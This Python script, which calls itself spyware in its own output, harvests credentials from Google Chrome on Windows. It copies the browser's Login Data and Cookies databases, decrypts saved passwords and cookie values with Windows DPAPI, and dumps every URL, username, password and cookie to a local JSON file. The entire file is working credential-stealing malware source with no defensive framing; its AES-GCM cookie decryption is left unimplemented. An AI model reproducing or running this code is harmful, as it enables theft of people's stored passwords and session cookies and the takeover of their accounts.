import os
import shutil
import sqlite3
import win32crypt
import json

def decrypt_chrome_password(encrypted_password):
    try:
        # Windows DPAPI decrypt
        return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
    except Exception:
        return ""

def grab_chrome_passwords():
    data_path = os.path.expandvars(r'%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default')
    login_db = os.path.join(data_path, 'Login Data')
    passwords = []

    if not os.path.exists(login_db):
        print("[!] Chrome Login Data DB not found.")
        return passwords

    # Copy file to avoid DB lock
    shutil.copy2(login_db, "LoginData_temp.db")

    conn = sqlite3.connect("LoginData_temp.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for origin_url, username, encrypted_password in cursor.fetchall():
            password = decrypt_chrome_password(encrypted_password)
            if username or password:
                passwords.append({
                    "url": origin_url,
                    "username": username,
                    "password": password
                })
    except Exception as e:
        print(f"[!] Error reading Chrome passwords: {e}")
    cursor.close()
    conn.close()
    os.remove("LoginData_temp.db")
    return passwords

def grab_chrome_cookies():
    data_path = os.path.expandvars(r'%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default')
    cookie_db = os.path.join(data_path, 'Cookies')
    cookies = []

    if not os.path.exists(cookie_db):
        print("[!] Chrome Cookies DB not found.")
        return cookies

    shutil.copy2(cookie_db, "Cookies_temp.db")

    conn = sqlite3.connect("Cookies_temp.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        for host_key, name, encrypted_value in cursor.fetchall():
            # Chrome cookie encryption can be AES-GCM; fallback to DPAPI decrypt
            try:
                decrypted = decrypt_chrome_password(encrypted_value)
                if decrypted == "":
                    # Could implement AES-GCM decrypt here with key from Local State file
                    decrypted = "<encrypted>"
            except Exception:
                decrypted = "<error>"
            cookies.append({
                "host": host_key,
                "name": name,
                "value": decrypted
            })
    except Exception as e:
        print(f"[!] Error reading Chrome cookies: {e}")
    cursor.close()
    conn.close()
    os.remove("Cookies_temp.db")
    return cookies

def run():
    print("[*] Starting spyware: Grabbing Chrome passwords and cookies...\\n")
    passwords = grab_chrome_passwords()
    cookies = grab_chrome_cookies()

    results = {
        "passwords": passwords,
        "cookies": cookies
    }

    output_file = "chrome_spy_results.json"
    with open(output_file, "w", encoding='utf-8') as f:
        json.dump(results, f, indent=4)

    print(f"[+] Grabbed {len(passwords)} passwords and {len(cookies)} cookies.")
    print(f"[+] Results saved to {output_file}")